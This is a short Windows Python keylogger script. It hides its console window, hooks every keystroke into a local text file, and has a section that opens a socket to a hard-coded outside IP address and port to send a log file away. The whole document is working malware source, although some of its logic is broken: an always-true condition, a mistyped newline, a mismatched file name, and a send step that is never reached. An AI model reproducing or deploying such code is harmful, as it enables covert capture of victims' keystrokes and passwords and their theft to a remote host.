import win32api
import win32console
import win32gui
import pythoncom,pyHook
import socket

 
win=win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
 
def OnKeyboardEvent(event):
if event.Ascii==5:
_exit(1)
if event.Ascii !=0 or 8:
#open output.txt to read current keystrokes
thefile=open('c:\output.txt','r+')
buffer=thefile.read()
thefile.close()
#open output.txt to write current + new keystrokes
thefile=open('c:\output.txt','w')
keylogs=chr(event.Ascii)
if event.Ascii==13:
keylogs='/n'
buffer+=keylogs
thefile.write(buffer)
thefile.close()
# create a hook manager object
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()

#=============================================
#sending txt file

f = open('keylogtest.txt', 'r')
strf = str(f.read())
print(strf)
eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
eggs.connect(('107.170.79.196', 9010))
eggs.sendall(strf)

print("done")